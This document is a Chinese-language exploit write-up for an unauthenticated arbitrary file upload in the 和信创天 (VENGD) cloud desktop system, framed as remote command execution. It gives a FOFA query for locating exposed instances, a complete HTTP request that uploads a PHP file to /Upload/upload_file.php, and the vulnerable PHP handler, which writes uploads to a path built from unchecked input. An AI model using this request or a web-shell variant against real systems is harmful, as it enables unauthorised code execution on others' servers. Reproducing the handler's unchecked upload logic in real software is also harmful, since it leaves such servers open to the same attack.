# 和信创天云桌面系统 远程命令执行 RCE漏洞

## 漏洞描述

和信创天云桌面系统存在前台任意文件上传漏洞

## 漏洞影响

> [!NOTE]
>
> 和信创天云桌面系统

> [!NOTE]
>
> FOFA: title="和信下一代云桌面VENGD"

## 漏洞复现

请求包如下

```
POST /Upload/upload_file.php?l=1 HTTP/1.1
Host: 127.0.0.1:2001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8
Referer: http://127.0.0.1:2001/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,fil;q=0.8
Cookie: think_language=zh-cn; PHPSESSID_NAMED=h9j8utbmv82cb1dcdlav1cgdf6
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv
Content-Length: 182

------WebKitFormBoundaryfcKRltGv
Content-Disposition: form-data; name="file"; filename="2.php"
Content-Type: image/avif

<?php phpinfo(); ?>
------WebKitFormBoundaryfcKRltGv--

```

![](resource/和信创天云桌面系统-远程命令执行-RCE漏洞/media/1.png)

![](resource/和信创天云桌面系统-远程命令执行-RCE漏洞/media/2.jpg)

## 漏洞分析

`upload_file.php`

```php
<?php
function writeLog($msg){
    $logFile = date('Y-m-d').'.txt';
    $msg = date('Y-m-d H:i:s').' >>> '.$msg."\r\n";
    file_put_contents($logFile,$msg,FILE_APPEND );
}
//require("vesystem/msg_define/session_lib.php");
if ($_FILES["file"]["error"] > 0)
{
  echo "Return Code: " . $_FILES["file"]["error"] . "";
}
else
{
    echo "_Requst:<br>";
        /*     foreach($_REQUEST as $name => $value)
            {
                 $name."=".$value."<br>";
            }
            //echo "_FILES:<br>";
            foreach($_FILES as $array_name=>$array_value)
            {    
            $array_name."=".$array_value."<br>";
                foreach($_FILES[$array_name] as $name => $value)
                {
                $name."=".$value."<br>";
                }
            } */
        $l = $_GET['l'];
        //拆分字符串按“/”分割字符
        $arrpath = explode("/",$l);
        $m = count($arrpath);
        $file_e = "";
        if ($m>1){
            for($i=0;$i<$m;$i++){
                $file_e .= $arrpath[$i];
                if(!file_exists($file_e)){
                    mkdir($file_e, 0777);
                }
                $file_e .= "/";
            }
        }else{
            //判断文件夹是否存在 ，不存在就新建个
            if(!file_exists($l)){
                mkdir("$l", 0777);
            }
        }
        $target_path=$_SERVER["DOCUMENT_ROOT"]."/Upload/".$l."/".$_FILES["file"]["name"];
        if (file_exists($target_path))
        {
            unl ink($target_path);
        }
        $a = 'old_file='.$_FILES["file"]["tmp_name"];
        writeLog($a);
        writeLog('new_file='.$target_path);
    $target_path = str_replace ( '//', '/', $target_path );
    writeLog('new_file2='.$target_path);
   $varerror =  move_uploaded_file($_FILES["file"]["tmp_name"],$target_path);
    writeLog('$varerror='.$varerror);
}
?>
```

直接就是任意文件上传，获取参数l然后上传的文件名路径为

`/Upload/“.$l.”/“.$_FILES[“file”][“name”]`